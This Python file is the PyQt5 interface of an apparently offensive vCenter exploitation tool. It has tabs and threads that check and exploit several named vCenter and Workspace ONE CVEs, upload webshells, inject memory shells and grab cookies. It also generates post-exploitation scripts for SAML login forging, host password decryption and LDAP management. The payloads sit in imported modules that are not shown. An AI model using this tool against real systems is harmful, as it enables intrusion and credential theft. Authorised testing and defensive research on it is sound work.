import sys
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import QThread, pyqtSignal
from PyQt5.QtGui import QTextCursor
from utils.CollectVcenterInfo import VcenterInfo
from utils.exploit.cve_2021_21972.cve_2021_21972_check import cve_2021_21972_check
from utils.exploit.cve_2021_21972.cve_2021_21972_shell_upload import cve_2021_21972_shell_upload
from utils.exploit.cve_2021_21985.cve_2021_21985_check import cve_2021_21985_check
from utils.exploit.cve_2021_21985.cve_2021_21985_exploit import cve_2021_21985_exploit
from utils.exploit.cve_2021_22005.cve_2021_22005_check import cve_2021_22005_check
from utils.exploit.cve_2021_22005.cve_2021_22005_exploit import cve_2021_22005_exploit
from utils.exploit.cve_2022_22954.cve_2022_22954_check import cve_2022_22954_check
from utils.exploit.cve_2022_22954.cve_2022_22954_exploit import cve_2022_22954_exploit
from utils.exploit.cve_2022_22972.cve_2022_22972_get_cookie import cve_2022_22972_get_cookie
from utils.exploit.post_exploitation.generate_vcenter_extracertfrommdb_and_vcenter_generatelogincookie_py import \
    generate_vcenter_extracertfrommdb_and_vcenter_generatelogincookie_py
from utils.exploit.post_exploitation.generate_vcenter_ldapmanage_py import generate_vcenter_ldapmanage_py
from utils.exploit.post_exploitation.generate_vcenter_saml_login_py import generate_vcenter_saml_login_py
from utils.exploit.post_exploitation.generate_vhost_password_decrypt_py import generate_vhost_password_decrypt_py

from utils.output import output_format


class Thread_Cve_2022_22972_exploit(QThread):
    update_date = pyqtSignal(str)

    def __init__(self, url_text):
        super(Thread_Cve_2022_22972_exploit, self).__init__()
        self.url_text = url_text

    def run(self):
        _cve_2022_22972_exploit = cve_2022_22972_get_cookie(self.url_text, self.update_date)
        _cve_2022_22972_exploit.get_cookie()

class Thread_Cve_2022_22954_exploit(QThread):
    update_date = pyqtSignal(str)

    def __init__(self, url_text, result_text, command_text, shell_text, shell_name_text):
        super(Thread_Cve_2022_22954_exploit, self).__init__()
        self.url_text = url_text
        self.result_text = result_text
        self.command_text = command_text
        self.shell_text = shell_text
        self.shell_name_text = shell_name_text

    def run(self):
        _cve_2022_22954_exploit = cve_2022_22954_exploit(self.url_text, self.result_text, self.update_date, self.command_text, self.shell_text, self.shell_name_text)
        _cve_2022_22954_exploit.exploit()

class Thread_Cve_2022_22954_check(QThread):
    update_date = pyqtSignal(str)

    def __init__(self, url_text, result_text):
        super(Thread_Cve_2022_22954_check, self).__init__()
        self.url_text = url_text
        self.result_text = result_text

    def run(self):
        _cve_2022_22954_check = cve_2022_22954_check(self.url_text, self.result_text, self.update_date)
        _cve_2022_22954_check.check()

class Thread_Cve_2021_22005_exploit(QThread):
    update_date = pyqtSignal(str)

    def __init__(self, url_text, result_text, shell_text, shell_name_text):
        super(Thread_Cve_2021_22005_exploit, self).__init__()
        self.url_text = url_text
        self.result_text = result_text
        self.shell_text = shell_text
        self.shell_name_text = shell_name_text

    def run(self):
        _cve_2021_22005_exploit = cve_2021_22005_exploit(self.url_text, self.result_text, self.update_date, self.shell_text, self.shell_name_text)
        _cve_2021_22005_exploit.exploit()

class Thread_Cve_2021_22005_check(QThread):
    update_date = pyqtSignal(str)

    def __init__(self, url_text, result_text):
        super(Thread_Cve_2021_22005_check, self).__init__()
        self.url_text = url_text
        self.result_text = result_text

    def run(self):
        _cve_2021_22005_check = cve_2021_22005_check(self.url_text, self.result_text, self.update_date)
        _cve_2021_22005_check.check()

class Thread_Cve_2021_21985_exploit(QThread):
    update_date = pyqtSignal(str)

    def __init__(self, url_text, result_text, command_txt, rmi_txt):
        super(Thread_Cve_2021_21985_exploit, self).__init__()
        self.url_text = url_text
        self.result_text = result_text
        self.command_txt = command_txt
        self.rmi_txt = rmi_txt

    def run(self):
        _cve_2021_21985_exploit = cve_2021_21985_exploit(self.url_text, self.result_text, self.update_date, self.command_txt, self.rmi_txt)
        _cve_2021_21985_exploit.exploit()


class Thread_Cve_2021_21985_check(QThread):
    update_date = pyqtSignal(str)

    def __init__(self, url_text, result_text):
        super(Thread_Cve_2021_21985_check, self).__init__()
        self.cve_2021_21985_target_url_text = url_text
        self.cve_2021_21985_result_text = result_text

    def run(self):
        _cve_2021_21985_check = cve_2021_21985_check(self.cve_2021_21985_target_url_text, self.cve_2021_21985_result_text, self.update_date)
        _cve_2021_21985_check.check()


class Thread_Cve_2021_21972_check(QThread):
    update_date = pyqtSignal(str)

    def __init__(self, url_text, result_text):
        super(Thread_Cve_2021_21972_check, self).__init__()
        self.cve_2021_21972_target_url_text = url_text
        self.cve_2021_21972_result_text = result_text

    def run(self):
        _cve_2021_21972_check = cve_2021_21972_check(self.cve_2021_21972_target_url_text, self.cve_2021_21972_result_text, self.update_date)
        _cve_2021_21972_check.check()


class Thread_Cve_2021_21972_exploit(QThread):
    update_date = pyqtSignal(str)

    def __init__(self, url_text, shell_text, result_text, shell_name_text):
        super(Thread_Cve_2021_21972_exploit, self).__init__()
        self.cve_2021_21972_target_url_text = url_text
        self.cve_2021_21972_shell_text = shell_text
        self.cve_2021_21972_exploit_result_text = result_text
        self.cve_2021_21972_exploit_shell_name_text = shell_name_text

    def run(self):
        _cve_2021_21972_exploit = cve_2021_21972_shell_upload(self.cve_2021_21972_target_url_text, self.cve_2021_21972_shell_text, self.cve_2021_21972_exploit_result_text, self.cve_2021_21972_exploit_shell_name_text, self.update_date)
        _cve_2021_21972_exploit.upload_and_check_shell_task_manager()


class ThreadCollectVcenterInfo(QThread):
    update_date = pyqtSignal(str)

    def __init__(self, info_collect_url_text, info_collect_result_text):
        super(ThreadCollectVcenterInfo, self).__init__()
        self.info_collect_url_text = info_collect_url_text
        self.info_collect_result_text = info_collect_result_text

    def run(self):
        vcenterinfo = VcenterInfo(self.info_collect_url_text, self.info_collect_result_text, self.update_date)
        vcenterinfo.CollectVcenterInfo()


class Ui_MainWindow(object):

    # post_exploitation
    def click_generate_vsl(self):
        usage = generate_vcenter_saml_login_py()
        self.py_script_generate_result_text.append(output_format("SUCCESS", "The <vcenter_saml_login.py> has been successfully generated to the program's root directory!"))
        self.py_script_generate_result_text.append(output_format("INFO", f"The usage of <vcenter_saml_login.py> is as follows: \n{'-' * 30}\n{usage}\n{'-' * 30}"))

    def click_generate_vpd(self):
        usage = generate_vhost_password_decrypt_py()
        self.py_script_generate_result_text.append(output_format("SUCCESS", "The <vhost_password_decrypt.py> has been successfully generated to the program's root directory!"))
        self.py_script_generate_result_text.append(output_format("INFO", f"The usage of <vhost_password_decrypt.py> is as follows: \n{'-' * 30}\n{usage}\n{'-' * 30}"))

    def click_generate_vefm_and_vlc(self):
        vCenter_ExtraCertFromMdb_usage = generate_vcenter_extracertfrommdb_and_vcenter_generatelogincookie_py()[0]
        vCenter_GenerateLoginCookie_usage = generate_vcenter_extracertfrommdb_and_vcenter_generatelogincookie_py()[1]
        self.py_script_generate_result_text.append(output_format("SUCCESS", "The <vCenter_ExtraCertFromMdb.py> and <vCenter_GenerateLoginCookie.py> has been successfully generated to the program's root directory!"))
        self.py_script_generate_result_text.append(output_format("INFO", f"The usage of <vCenter_ExtraCertFromMdb.py> is as follows: \n{'-' * 30}\n{vCenter_ExtraCertFromMdb_usage}\n{'-' * 30}"))
        self.py_script_generate_result_text.append(output_format("INFO", f"The usage of <vCenter_GenerateLoginCookie.py> is as follows: \n{'-' * 30}\n{vCenter_GenerateLoginCookie_usage}\n{'-' * 30}"))

    def click_generate_vlm(self):
        usage = generate_vcenter_ldapmanage_py()
        self.py_script_generate_result_text.append(output_format("SUCCESS", "The <vCenterLDAP_Manage.py> has been successfully generated to the program's root directory!"))
        self.py_script_generate_result_text.append(output_format("INFO", f"The usage of <vCenterLDAP_Manage.py> is as follows: \n{'-' * 30}\n{usage}\n{'-' * 30}"))

    def Click_CVE_2022_22972_exploit_Button(self):
        self.Cve_2022_22972_exploit_thread = Thread_Cve_2022_22972_exploit(self.cve_2022_22972_target_url_text)
        self.Cve_2022_22972_exploit_thread.update_date.connect(self.show_CVE_2022_22972_exploit_Info)
        self.Cve_2022_22972_exploit_thread.start()

    def show_CVE_2022_22972_exploit_Info(self, display_newstr):
        self.cve_2022_22972_result_text.setPlainText(self.cve_2022_22972_result_text.toPlainText() + display_newstr + "\n")
        self.cve_2022_22972_result_text.moveCursor(QTextCursor.End)

    def Click_CVE_2022_22954_exploit_Button(self):
        self.Cve_2022_22954_exploit_thread = Thread_Cve_2022_22954_exploit(self.cve_2022_22954_target_url_text, self.cve_2022_22954_result_text, self.cve_2022_22954_target_command_text, self.cve_2022_22954_target_shell_text, self.cve_2022_22954_target_shell_name_text)
        self.Cve_2022_22954_exploit_thread.update_date.connect(self.show_CVE_2022_22954_exploit_Info)
        self.Cve_2022_22954_exploit_thread.start()

    def show_CVE_2022_22954_exploit_Info(self, display_newstr):
        self.cve_2022_22954_result_text.setPlainText(self.cve_2022_22954_result_text.toPlainText() + display_newstr + "\n")
        self.cve_2022_22954_result_text.moveCursor(QTextCursor.End)

    def Click_CVE_2022_22954_check_Button(self):
        self.Cve_2022_22954_check_thread = Thread_Cve_2022_22954_check(self.cve_2022_22954_target_url_text, self.cve_2022_22954_result_text)
        self.Cve_2022_22954_check_thread.update_date.connect(self.show_CVE_2022_22954_check_Info)
        self.Cve_2022_22954_check_thread.start()

    def show_CVE_2022_22954_check_Info(self, display_newstr):
        self.cve_2022_22954_result_text.setPlainText(self.cve_2022_22954_result_text.toPlainText() + display_newstr + "\n")
        self.cve_2022_22954_result_text.moveCursor(QTextCursor.End)

    def Click_CVE_2021_22005_exploit_Button(self):
        self.Cve_2021_22005_exploit_thread = Thread_Cve_2021_22005_exploit(self.cve_2021_22005_target_url_text, self.cve_2021_22005_result_text, self.cve_2021_22205_target_shell_text, self.cve_2021_22005_target_shell_name_text)
        self.Cve_2021_22005_exploit_thread.update_date.connect(self.show_CVE_2021_22005_exploit_Info)
        self.Cve_2021_22005_exploit_thread.start()

    def show_CVE_2021_22005_exploit_Info(self, display_newstr):
        self.cve_2021_22005_result_text.setPlainText(self.cve_2021_22005_result_text.toPlainText() + display_newstr + "\n")
        self.cve_2021_22005_result_text.moveCursor(QTextCursor.End)
    def Click_CVE_2021_22005_check_Button(self):
        self.Cve_2021_22005_check_thread = Thread_Cve_2021_22005_check(self.cve_2021_22005_target_url_text, self.cve_2021_22005_result_text)
        self.Cve_2021_22005_check_thread.update_date.connect(self.show_CVE_2021_22005_check_Info)
        self.Cve_2021_22005_check_thread.start()

    def show_CVE_2021_22005_check_Info(self, display_newstr):
        self.cve_2021_22005_result_text.setPlainText(self.cve_2021_22005_result_text.toPlainText() + display_newstr + "\n")
        self.cve_2021_22005_result_text.moveCursor(QTextCursor.End)

    def Click_CVE_2021_21985_exploit_Button(self):
        self.Cve_2021_21985_exploit_thread = Thread_Cve_2021_21985_exploit(self.cve_2021_21985_target_url_text, self.cve_2021_21985_result_text, self.cve_2021_21985_target_command_text, self.cve_2021_21985_target_rmi_text)
        self.Cve_2021_21985_exploit_thread.update_date.connect(self.show_CVE_2021_21985_exploit_Info)
        self.Cve_2021_21985_exploit_thread.start()

    def show_CVE_2021_21985_exploit_Info(self, display_newstr):
        self.cve_2021_21985_result_text.setPlainText(
            self.cve_2021_21985_result_text.toPlainText() + display_newstr + "\n")
        self.cve_2021_21985_result_text.moveCursor(QTextCursor.End)

    def Click_CVE_2021_21985_check_Button(self):
        self.Cve_2021_21985_check_thread = Thread_Cve_2021_21985_check(self.cve_2021_21985_target_url_text, self.cve_2021_21985_result_text)
        self.Cve_2021_21985_check_thread.update_date.connect(self.show_CVE_2021_21985_check_Info)
        self.Cve_2021_21985_check_thread.start()

    def show_CVE_2021_21985_check_Info(self, display_newstr):
        self.cve_2021_21985_result_text.setPlainText(
            self.cve_2021_21985_result_text.toPlainText() + display_newstr + "\n")
        self.cve_2021_21985_result_text.moveCursor(QTextCursor.End)

    def Click_CVE_2021_21972_exploit_Button(self):
        self.Cve_2021_21972_exploit_thread = Thread_Cve_2021_21972_exploit(self.cve_2021_21972_target_url_text, self.cve_2021_21972_target_shell_text, self.cve_2021_21972_result_text, self.cve_2021_21972_target_shell_name_text)
        self.Cve_2021_21972_exploit_thread.update_date.connect(self.show_CVE_2021_21972_exploit_Info)
        self.Cve_2021_21972_exploit_thread.start()

    def show_CVE_2021_21972_exploit_Info(self, display_newstr):
        self.cve_2021_21972_result_text.setPlainText(
            self.cve_2021_21972_result_text.toPlainText() + display_newstr + "\n")
        self.cve_2021_21972_result_text.moveCursor(QTextCursor.End)

    def Click_CVE_2021_21972_check_Button(self):
        self.Cve_2021_21972_check_thread = Thread_Cve_2021_21972_check(self.cve_2021_21972_target_url_text, self.cve_2021_21972_result_text)
        self.Cve_2021_21972_check_thread.update_date.connect(self.show_CVE_2021_21972_check_Info)
        self.Cve_2021_21972_check_thread.start()

    def show_CVE_2021_21972_check_Info(self, display_newstr):
        self.cve_2021_21972_result_text.setPlainText(
            self.cve_2021_21972_result_text.toPlainText() + display_newstr + "\n")
        self.cve_2021_21972_result_text.moveCursor(QTextCursor.End)

    def ClickCollectVcenterInfoButton(self):
        self.CollectVcenterInfo = ThreadCollectVcenterInfo(self.info_collect_url_text, self.info_collect_result_text)
        self.CollectVcenterInfo.update_date.connect(self.show_CollectVcenterInfo)
        self.CollectVcenterInfo.start()

    def show_CollectVcenterInfo(self, display_newstr):
        self.info_collect_result_text.setPlainText(self.info_collect_result_text.toPlainText() + display_newstr + "\n")
        self.info_collect_result_text.moveCursor(QTextCursor.End)

    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(1200, 740)
        MainWindow.setMinimumSize(QtCore.QSize(1200, 740))
        MainWindow.setMaximumSize(QtCore.QSize(1200, 740))
        MainWindow.setBaseSize(QtCore.QSize(0, 0))
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(".\\logo.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        MainWindow.setWindowIcon(icon)
        MainWindow.setIconSize(QtCore.QSize(24, 24))
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.tabWidget = QtWidgets.QTabWidget(self.centralwidget)
        self.tabWidget.setGeometry(QtCore.QRect(0, 0, 1200, 740))
        self.tabWidget.setMinimumSize(QtCore.QSize(1200, 740))
        self.tabWidget.setObjectName("tabWidget")
        self.info_collect = QtWidgets.QWidget()
        self.info_collect.setObjectName("info_collect")
        self.collect_info_target_groupbox = QtWidgets.QGroupBox(self.info_collect)
        self.collect_info_target_groupbox.setGeometry(QtCore.QRect(10, 10, 1171, 81))
        self.collect_info_target_groupbox.setObjectName("collect_info_target_groupbox")
        self.info_collect_url_label = QtWidgets.QLabel(self.collect_info_target_groupbox)
        self.info_collect_url_label.setGeometry(QtCore.QRect(20, 20, 91, 41))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.info_collect_url_label.setFont(font)
        self.info_collect_url_label.setObjectName("info_collect_url_label")
        self.info_collect_url_text = QtWidgets.QLineEdit(self.collect_info_target_groupbox)
        self.info_collect_url_text.setGeometry(QtCore.QRect(120, 20, 801, 41))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.info_collect_url_text.setFont(font)
        self.info_collect_url_text.setObjectName("info_collect_url_text")
        self.info_collect_button = QtWidgets.QPushButton(self.collect_info_target_groupbox)
        self.info_collect_button.setGeometry(QtCore.QRect(930, 20, 231, 41))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.info_collect_button.setFont(font)
        self.info_collect_button.setObjectName("info_collect_button")
        self.info_collect_button.raise_()
        self.info_collect_url_label.raise_()
        self.info_collect_url_text.raise_()
        self.collect_info_result_groupbox = QtWidgets.QGroupBox(self.info_collect)
        self.collect_info_result_groupbox.setGeometry(QtCore.QRect(10, 100, 1171, 561))
        self.collect_info_result_groupbox.setObjectName("collect_info_result_groupbox")
        self.info_collect_result_text = QtWidgets.QTextBrowser(self.collect_info_result_groupbox)
        self.info_collect_result_text.setGeometry(QtCore.QRect(10, 20, 1151, 531))
        font = QtGui.QFont()
        font.setFamily("Courier New")
        font.setPointSize(12)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        self.info_collect_result_text.setFont(font)
        self.info_collect_result_text.viewport().setProperty("cursor", QtGui.QCursor(QtCore.Qt.ArrowCursor))
        self.info_collect_result_text.setStyleSheet("background-color: #ffffff;\n"
"font: 12pt \"Courier New\";\n"
"color: #006600;")
        self.info_collect_result_text.setLocale(QtCore.QLocale(QtCore.QLocale.English, QtCore.QLocale.UnitedStates))
        self.info_collect_result_text.setMarkdown("")
        self.info_collect_result_text.setOverwriteMode(False)
        self.info_collect_result_text.setPlaceholderText("")
        self.info_collect_result_text.setObjectName("info_collect_result_text")
        icon1 = QtGui.QIcon()
        icon1.addPixmap(QtGui.QPixmap(".\\info_tab_icon.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.tabWidget.addTab(self.info_collect, icon1, "")
        self.cve_2021_21972 = QtWidgets.QWidget()
        self.cve_2021_21972.setObjectName("cve_2021_21972")
        self.cve_2021_21972_target_groupbox = QtWidgets.QGroupBox(self.cve_2021_21972)
        self.cve_2021_21972_target_groupbox.setGeometry(QtCore.QRect(10, 10, 1171, 201))
        self.cve_2021_21972_target_groupbox.setObjectName("cve_2021_21972_target_groupbox")
        self.cve_2021_21972_target_url_label = QtWidgets.QLabel(self.cve_2021_21972_target_groupbox)
        self.cve_2021_21972_target_url_label.setGeometry(QtCore.QRect(10, 10, 81, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21972_target_url_label.setFont(font)
        self.cve_2021_21972_target_url_label.setObjectName("cve_2021_21972_target_url_label")
        self.cve_2021_21972_target_url_text = QtWidgets.QLineEdit(self.cve_2021_21972_target_groupbox)
        self.cve_2021_21972_target_url_text.setGeometry(QtCore.QRect(90, 10, 821, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21972_target_url_text.setFont(font)
        self.cve_2021_21972_target_url_text.setObjectName("cve_2021_21972_target_url_text")
        self.cve_2021_21972_target_shell_label = QtWidgets.QLabel(self.cve_2021_21972_target_groupbox)
        self.cve_2021_21972_target_shell_label.setGeometry(QtCore.QRect(50, 90, 31, 21))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(10)
        self.cve_2021_21972_target_shell_label.setFont(font)
        self.cve_2021_21972_target_shell_label.setObjectName("cve_2021_21972_target_shell_label")
        self.cve_2021_21972_target_shell_text = QtWidgets.QTextEdit(self.cve_2021_21972_target_groupbox)
        self.cve_2021_21972_target_shell_text.setGeometry(QtCore.QRect(90, 50, 821, 101))
        self.cve_2021_21972_target_shell_text.setPlaceholderText("")
        self.cve_2021_21972_target_shell_text.setObjectName("cve_2021_21972_target_shell_text")
        self.cve_2021_21972_target_check = QtWidgets.QPushButton(self.cve_2021_21972_target_groupbox)
        self.cve_2021_21972_target_check.setGeometry(QtCore.QRect(960, 10, 181, 31))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.cve_2021_21972_target_check.setFont(font)
        self.cve_2021_21972_target_check.setObjectName("cve_2021_21972_target_check")
        self.cve_2021_21972_target_exploit = QtWidgets.QPushButton(self.cve_2021_21972_target_groupbox)
        self.cve_2021_21972_target_exploit.setGeometry(QtCore.QRect(960, 50, 181, 141))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.cve_2021_21972_target_exploit.setFont(font)
        self.cve_2021_21972_target_exploit.setObjectName("cve_2021_21972_target_exploit")
        self.cve_2021_21972_target_shell_name_label = QtWidgets.QLabel(self.cve_2021_21972_target_groupbox)
        self.cve_2021_21972_target_shell_name_label.setGeometry(QtCore.QRect(10, 160, 71, 31))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(10)
        self.cve_2021_21972_target_shell_name_label.setFont(font)
        self.cve_2021_21972_target_shell_name_label.setObjectName("cve_2021_21972_target_shell_name_label")
        self.cve_2021_21972_target_shell_name_text = QtWidgets.QLineEdit(self.cve_2021_21972_target_groupbox)
        self.cve_2021_21972_target_shell_name_text.setGeometry(QtCore.QRect(90, 160, 821, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21972_target_shell_name_text.setFont(font)
        self.cve_2021_21972_target_shell_name_text.setObjectName("cve_2021_21972_target_shell_name_text")
        self.cve_2021_21972_result_groupbox = QtWidgets.QGroupBox(self.cve_2021_21972)
        self.cve_2021_21972_result_groupbox.setGeometry(QtCore.QRect(10, 210, 1171, 451))
        self.cve_2021_21972_result_groupbox.setObjectName("cve_2021_21972_result_groupbox")
        self.cve_2021_21972_result_text = QtWidgets.QTextBrowser(self.cve_2021_21972_result_groupbox)
        self.cve_2021_21972_result_text.setGeometry(QtCore.QRect(10, 20, 1151, 421))
        self.cve_2021_21972_result_text.viewport().setProperty("cursor", QtGui.QCursor(QtCore.Qt.ArrowCursor))
        self.cve_2021_21972_result_text.setStyleSheet("background-color: #ffffff;\n""font: 12pt \"Courier New\";\n""color: #006600;")
        self.cve_2021_21972_result_text.setMarkdown("")
        self.cve_2021_21972_result_text.setOverwriteMode(False)
        self.cve_2021_21972_result_text.setPlaceholderText("")
        self.cve_2021_21972_result_text.setObjectName("cve_2021_21972_result_text")
        icon2 = QtGui.QIcon()
        icon2.addPixmap(QtGui.QPixmap(".\\tabicon.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.tabWidget.addTab(self.cve_2021_21972, icon2, "")
        self.cve_2021_21985 = QtWidgets.QWidget()
        self.cve_2021_21985.setObjectName("cve_2021_21985")
        self.cve_2021_21985_result_groupbox = QtWidgets.QGroupBox(self.cve_2021_21985)
        self.cve_2021_21985_result_groupbox.setGeometry(QtCore.QRect(10, 250, 1171, 411))
        self.cve_2021_21985_result_groupbox.setObjectName("cve_2021_21985_result_groupbox")
        self.cve_2021_21985_result_text = QtWidgets.QTextBrowser(self.cve_2021_21985_result_groupbox)
        self.cve_2021_21985_result_text.setGeometry(QtCore.QRect(10, 20, 1151, 381))
        self.cve_2021_21985_result_text.viewport().setProperty("cursor", QtGui.QCursor(QtCore.Qt.ArrowCursor))
        self.cve_2021_21985_result_text.setStyleSheet("background-color: #ffffff;\n"
"font: 12pt \"Courier New\";\n"
"color: #006600;")
        self.cve_2021_21985_result_text.setMarkdown("")
        self.cve_2021_21985_result_text.setOverwriteMode(False)
        self.cve_2021_21985_result_text.setPlaceholderText("")
        self.cve_2021_21985_result_text.setObjectName("cve_2021_21985_result_text")
        self.cve_2021_21985_target_groupbox = QtWidgets.QGroupBox(self.cve_2021_21985)
        self.cve_2021_21985_target_groupbox.setGeometry(QtCore.QRect(10, 10, 1171, 241))
        self.cve_2021_21985_target_groupbox.setObjectName("cve_2021_21985_target_groupbox")
        self.cve_2021_21985_target_url_label = QtWidgets.QLabel(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_target_url_label.setGeometry(QtCore.QRect(80, 10, 61, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21985_target_url_label.setFont(font)
        self.cve_2021_21985_target_url_label.setObjectName("cve_2021_21985_target_url_label")
        self.cve_2021_21985_target_url_text = QtWidgets.QLineEdit(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_target_url_text.setGeometry(QtCore.QRect(150, 10, 401, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21985_target_url_text.setFont(font)
        self.cve_2021_21985_target_url_text.setObjectName("cve_2021_21985_target_url_text")
        self.cve_2021_21985_target_command_label = QtWidgets.QLabel(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_target_command_label.setGeometry(QtCore.QRect(80, 50, 61, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21985_target_command_label.setFont(font)
        self.cve_2021_21985_target_command_label.setObjectName("cve_2021_21985_target_command_label")
        self.cve_2021_21985_target_command_text = QtWidgets.QTextEdit(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_target_command_text.setGeometry(QtCore.QRect(150, 50, 401, 31))
        font = QtGui.QFont()
        font.setPointSize(12)
        self.cve_2021_21985_target_command_text.setFont(font)
        self.cve_2021_21985_target_command_text.setPlaceholderText("")
        self.cve_2021_21985_target_command_text.setObjectName("cve_2021_21985_target_command_text")
        self.cve_2021_21985_target_check_button = QtWidgets.QPushButton(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_target_check_button.setGeometry(QtCore.QRect(970, 10, 181, 31))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.cve_2021_21985_target_check_button.setFont(font)
        self.cve_2021_21985_target_check_button.setObjectName("cve_2021_21985_target_check_button")
        self.cve_2021_21985_exploit_button = QtWidgets.QPushButton(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_exploit_button.setGeometry(QtCore.QRect(970, 50, 181, 31))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.cve_2021_21985_exploit_button.setFont(font)
        self.cve_2021_21985_exploit_button.setObjectName("cve_2021_21985_exploit_button")
        self.cve_2021_21985_target_rmi_label = QtWidgets.QLabel(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_target_rmi_label.setGeometry(QtCore.QRect(560, 10, 81, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21985_target_rmi_label.setFont(font)
        self.cve_2021_21985_target_rmi_label.setObjectName("cve_2021_21985_target_rmi_label")
        self.cve_2021_21985_target_rmi_text = QtWidgets.QLineEdit(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_target_rmi_text.setGeometry(QtCore.QRect(650, 10, 301, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21985_target_rmi_text.setFont(font)
        self.cve_2021_21985_target_rmi_text.setObjectName("cve_2021_21985_target_rmi_text")
        self.cve_2021_21985_target_shell_label = QtWidgets.QLabel(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_target_shell_label.setGeometry(QtCore.QRect(110, 120, 31, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21985_target_shell_label.setFont(font)
        self.cve_2021_21985_target_shell_label.setObjectName("cve_2021_21985_target_shell_label")
        self.cve_2021_21985_target_shell_text = QtWidgets.QTextEdit(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_target_shell_text.setGeometry(QtCore.QRect(150, 90, 801, 101))
        self.cve_2021_21985_target_shell_text.setPlaceholderText("")
        self.cve_2021_21985_target_shell_text.setObjectName("cve_2021_21985_target_shell_text")
        self.cve_2021_21985_target_shell_name_label = QtWidgets.QLabel(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_target_shell_name_label.setGeometry(QtCore.QRect(570, 50, 71, 31))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(10)
        self.cve_2021_21985_target_shell_name_label.setFont(font)
        self.cve_2021_21985_target_shell_name_label.setObjectName("cve_2021_21985_target_shell_name_label")
        self.cve_2021_21985_shell_name_text = QtWidgets.QLineEdit(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_shell_name_text.setGeometry(QtCore.QRect(650, 50, 301, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21985_shell_name_text.setFont(font)
        self.cve_2021_21985_shell_name_text.setObjectName("cve_2021_21985_shell_name_text")
        self.cve_2021_21985_target_shell_upload_path_label = QtWidgets.QLabel(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_target_shell_upload_path_label.setGeometry(QtCore.QRect(10, 200, 131, 31))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(10)
        self.cve_2021_21985_target_shell_upload_path_label.setFont(font)
        self.cve_2021_21985_target_shell_upload_path_label.setObjectName("cve_2021_21985_target_shell_upload_path_label")
        self.cve_2021_21985_shell_upload_path_text = QtWidgets.QLineEdit(self.cve_2021_21985_target_groupbox)
        self.cve_2021_21985_shell_upload_path_text.setGeometry(QtCore.QRect(150, 200, 801, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21985_shell_upload_path_text.setFont(font)
        self.cve_2021_21985_shell_upload_path_text.setObjectName("cve_2021_21985_shell_upload_path_text")
        self.groupBox = QtWidgets.QGroupBox(self.cve_2021_21985_target_groupbox)
        self.groupBox.setGeometry(QtCore.QRect(970, 90, 181, 141))
        self.groupBox.setObjectName("groupBox")
        self.cve_2021_21985_shell_upload_button = QtWidgets.QPushButton(self.groupBox)
        self.cve_2021_21985_shell_upload_button.setGeometry(QtCore.QRect(10, 20, 161, 51))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21985_shell_upload_button.setFont(font)
        self.cve_2021_21985_shell_upload_button.setObjectName("cve_2021_21985_shell_upload_button")
        self.cve_2021_21985_inject_memory_shell_button = QtWidgets.QPushButton(self.groupBox)
        self.cve_2021_21985_inject_memory_shell_button.setGeometry(QtCore.QRect(10, 80, 161, 51))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_21985_inject_memory_shell_button.setFont(font)
        self.cve_2021_21985_inject_memory_shell_button.setObjectName("cve_2021_21985_inject_memory_shell_button")
        self.tabWidget.addTab(self.cve_2021_21985, icon2, "")
        self.cve_2021_22005 = QtWidgets.QWidget()
        self.cve_2021_22005.setObjectName("cve_2021_22005")
        self.cve_2021_22005_result_groupbox = QtWidgets.QGroupBox(self.cve_2021_22005)
        self.cve_2021_22005_result_groupbox.setGeometry(QtCore.QRect(10, 210, 1171, 451))
        self.cve_2021_22005_result_groupbox.setObjectName("cve_2021_22005_result_groupbox")
        self.cve_2021_22005_result_text = QtWidgets.QTextBrowser(self.cve_2021_22005_result_groupbox)
        self.cve_2021_22005_result_text.setGeometry(QtCore.QRect(10, 20, 1151, 421))
